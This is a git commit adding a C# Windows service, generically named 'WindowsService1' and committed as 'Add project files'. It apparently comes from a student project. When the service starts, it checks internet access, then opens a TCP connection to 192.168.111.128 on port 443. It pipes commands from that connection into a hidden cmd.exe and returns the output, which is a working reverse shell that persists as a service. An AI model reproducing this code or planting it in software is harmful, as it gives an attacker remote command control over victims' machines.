0eee6f35417bc00e6385b2e4a862d4066e1a9da1
Hoàng Tạ Việt <18520060@ms.uit.edu.vn>
2021-03-24 00:55:54 +0700

    Add project files.

---
+++ WindowsService1/Service1.cs
@@ -0,0 +1,137 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Timers;
+
+
+namespace WindowsService1
+{
+    public partial class Service1 : ServiceBase
+    {
+        static StreamWriter streamWriter;
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            if (check() == true)
+            {
+                WriteToFile("CONNECT " + DateTime.Now);
+                connect();
+            }
+            else
+            {
+                WriteToFile("OUT OF CONNECT" + DateTime.Now);
+            }
+
+          
+        }
+        private static bool check()
+        {
+            try
+            {
+                using (var Client = new WebClient())
+                using (Client.OpenRead("https://www.facebook.com/"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        
+        private void connect()
+        {
+			using (TcpClient client = new TcpClient("192.168.111.128", 443))
+			{
+				using (Stream stream = client.GetStream())
+				{
+					using (StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while (true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to.
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+        protected override void OnStop()
+        {
+            
+        }
+        
+        
+        
+    }
+}
